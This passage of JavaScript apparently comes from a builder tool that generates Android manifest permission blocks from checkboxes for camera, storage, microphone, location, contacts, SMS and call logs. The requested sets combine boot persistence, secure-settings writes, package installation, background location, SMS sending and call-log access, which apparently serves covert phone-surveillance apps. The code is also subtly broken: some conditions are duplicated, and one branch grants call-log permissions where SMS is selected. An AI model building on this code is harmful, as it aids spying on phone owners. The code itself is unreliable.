            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>
            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>         `
        }


        if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == false && checkBoxofMic.checked == true && checkBoxofLocation.checked == false && checkBoxofContacts.checked == true && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == false) {
            var Permissionsrules = `
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>
            <uses-permission android:name="android.permission.READ_SMS"/>
            <uses-permission android:name="android.permission.SEND_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
            <uses-permission android:name="android.permission.WRITE_SMS"/>
            <uses-permission android:name="android.permission.READ_CONTACTS"/>

            `
        }
        if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == false && checkBoxofMic.checked == true && checkBoxofLocation.checked == false && checkBoxofContacts.checked == true && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == true) {
            var Permissionsrules = `
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>
            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
            <uses-permission android:name="android.permission.READ_CONTACTS"/>

            `
        }

        if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == false && checkBoxofMic.checked == true && checkBoxofLocation.checked == false && checkBoxofContacts.checked == true && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == false) {
            var Permissionsrules = `
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>
            <uses-permission android:name="android.permission.READ_SMS"/>
            <uses-permission android:name="android.permission.SEND_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
            <uses-permission android:name="android.permission.WRITE_SMS"/>
            <uses-permission android:name="android.permission.READ_CONTACTS"/>

            `
        }


        if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == false && checkBoxofMic.checked == true && checkBoxofLocation.checked == false && checkBoxofContacts.checked == true && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == true) {
            var Permissionsrules = `
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>
            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
            <uses-permission android:name="android.permission.READ_CONTACTS"/>

            `
        }

        if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == false && checkBoxofMic.checked == true && checkBoxofLocation.checked == false && checkBoxofContacts.checked == false && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == true) {
            var Permissionsrules = `
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.READ_SMS"/>
            <uses-permission android:name="android.permission.SEND_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
            <uses-permission android:name="android.permission.WRITE_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
            `
        }
        if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == false && checkBoxofMic.checked == false && checkBoxofLocation.checked == true && checkBoxofContacts.checked == true && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == false) {
            var Permissionsrules = `
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.READ_SMS"/>
            <uses-permission android:name="android.permission.SEND_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
            <uses-permission android:name="android.permission.WRITE_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.READ_CONTACTS"/>
            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
            `
        }
        if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == false && checkBoxofMic.checked == false && checkBoxofLocation.checked == true && checkBoxofContacts.checked == true && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == true) {
            var Permissionsrules = `
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
            <uses-permission android:name="android.permission.READ_CONTACTS"/>
            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>         `
        }



        if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == false && checkBoxofMic.checked == false && checkBoxofLocation.checked == true && checkBoxofContacts.checked == false && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == true) {
            var Permissionsrules = `
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
            <uses-permission android:name="android.permission.READ_SMS"/>
            <uses-permission android:name="android.permission.SEND_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
            <uses-permission android:name="android.permission.WRITE_SMS"/>
            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>         `
        }


        if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == false && checkBoxofMic.checked == false && checkBoxofLocation.checked == false && checkBoxofContacts.checked == true && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == true) {
            var Permissionsrules = `
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
            <uses-permission android:name="android.permission.READ_CONTACTS"/>
            <uses-permission android:name="android.permission.READ_SMS"/>
            <uses-permission android:name="android.permission.SEND_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
            <uses-permission android:name="android.permission.WRITE_SMS"/>
            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>         `
        }
        //if four are checked
        if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == true && checkBoxofMic.checked == true && checkBoxofLocation.checked == true && checkBoxofContacts.checked == false && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == false) {
            var Permissionsrules = `
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.CAMERA"/>
            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-feature android:name="android.hardware.camera"/>
            <uses-feature android:name="android.hardware.camera.autofocus"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>
            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `
        }


        if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == true && checkBoxofMic.checked == true && checkBoxofLocation.checked == false && checkBoxofContacts.checked == true && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == false) {
            var Permissionsrules = `
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.CAMERA"/>
            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-feature android:name="android.hardware.camera"/>
            <uses-feature android:name="android.hardware.camera.autofocus"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.READ_CONTACTS"/>
            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `
        }

        if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == true && checkBoxofMic.checked == true && checkBoxofLocation.checked == false && checkBoxofContacts.checked == false && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == false) {
            var Permissionsrules = `
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.CAMERA"/>
            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.READ_SMS"/>
            <uses-permission android:name="android.permission.SEND_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
            <uses-permission android:name="android.permission.WRITE_SMS"/>
            <uses-feature android:name="android.hardware.camera"/>
            <uses-feature android:name="android.hardware.camera.autofocus"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `
        }


        if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == true && checkBoxofMic.checked == true && checkBoxofLocation.checked == false && checkBoxofContacts.checked == false && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == true) {
            var Permissionsrules = `
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.CAMERA"/>
            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-feature android:name="android.hardware.camera"/>
            <uses-feature android:name="android.hardware.camera.autofocus"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `
        }


        if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == true && checkBoxofMic.checked == false && checkBoxofLocation.checked == true && checkBoxofContacts.checked == true && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == false) {
            var Permissionsrules = `
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.CAMERA"/>
            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-feature android:name="android.hardware.camera"/>
            <uses-feature android:name="android.hardware.camera.autofocus"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.READ_CONTACTS"/>
            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `
        }

        if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == true && checkBoxofMic.checked == false && checkBoxofLocation.checked == true && checkBoxofContacts.checked == false && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == false) {
            var Permissionsrules = `
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.CAMERA"/>
            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.READ_SMS"/>
            <uses-permission android:name="android.permission.SEND_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
            <uses-permission android:name="android.permission.WRITE_SMS"/>
            <uses-feature android:name="android.hardware.camera"/>
            <uses-feature android:name="android.hardware.camera.autofocus"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `
        }

        if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == true && checkBoxofMic.checked == false && checkBoxofLocation.checked == true && checkBoxofContacts.checked == false && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == true) {
            var Permissionsrules = `
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.CAMERA"/>
            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-feature android:name="android.hardware.camera"/>
            <uses-feature android:name="android.hardware.camera.autofocus"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `
        }
        if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == true && checkBoxofMic.checked == false && checkBoxofLocation.checked == false && checkBoxofContacts.checked == true && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == false) {
            var Permissionsrules = `
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.CAMERA"/>
            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.READ_SMS"/>
            <uses-permission android:name="android.permission.SEND_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
            <uses-permission android:name="android.permission.WRITE_SMS"/>
            <uses-feature android:name="android.hardware.camera"/>
            <uses-feature android:name="android.hardware.camera.autofocus"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.READ_CONTACTS"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `
        }
        if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == true && checkBoxofMic.checked == false && checkBoxofLocation.checked == false && checkBoxofContacts.checked == true && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == true) {
            var Permissionsrules = `
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.CAMERA"/>
            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-feature android:name="android.hardware.camera"/>
            <uses-feature android:name="android.hardware.camera.autofocus"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
            <uses-permission android:name="android.permission.READ_CONTACTS"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `
        }
        if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == true && checkBoxofMic.checked == false && checkBoxofLocation.checked == false && checkBoxofContacts.checked == false && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == true) {
            var Permissionsrules = `
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.CAMERA"/>
            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.READ_SMS"/>
            <uses-permission android:name="android.permission.SEND_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
            <uses-permission android:name="android.permission.WRITE_SMS"/>
            <uses-feature android:name="android.hardware.camera"/>
            <uses-feature android:name="android.hardware.camera.autofocus"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `
        }

        if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == false && checkBoxofMic.checked == true && checkBoxofLocation.checked == true && checkBoxofContacts.checked == true && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == false) {
            var Permissionsrules = `
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.CAMERA"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-feature android:name="android.hardware.camera"/>
            <uses-feature android:name="android.hardware.camera.autofocus"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.READ_CONTACTS"/>
            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>
            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `
        }

        if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == false && checkBoxofMic.checked == true && checkBoxofLocation.checked == true && checkBoxofContacts.checked == false && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == false) {
            var Permissionsrules = `
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.CAMERA"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-feature android:name="android.hardware.camera"/>
            <uses-feature android:name="android.hardware.camera.autofocus"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
            <uses-permission android:name="android.permission.READ_CONTACTS"/>
            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `
        }


        if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == false && checkBoxofMic.checked == true && checkBoxofLocation.checked == true && checkBoxofContacts.checked == false && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == true) {
            var Permissionsrules = `
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.CAMERA"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-feature android:name="android.hardware.camera"/>
            <uses-feature android:name="android.hardware.camera.autofocus"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>
